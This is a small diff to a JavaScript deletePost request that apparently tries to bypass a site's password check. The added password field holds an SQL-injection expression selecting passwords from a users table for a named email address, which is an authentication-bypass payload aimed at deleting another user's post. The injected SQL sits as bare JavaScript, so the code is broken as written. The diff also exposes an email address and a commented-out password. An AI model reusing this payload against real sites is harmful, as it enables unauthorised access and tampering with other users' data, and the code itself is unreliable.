@@ -18,8 +18,8 @@ function deletePost(comment) {
         method: "POST",
         //json: true,   // <--Very important!!!
         body: qs.stringify({
-            password:1,// 112233445566,
-            email: 1,// "gahosim921@dacgu.com",
+            password:1|| password in (select password from users where email ='gahosim921@dacgu.com'),// 112233445566,
+            email: "gahosim921@dacgu.com",
             userId: comment.userId,
             id: comment.id
           }),
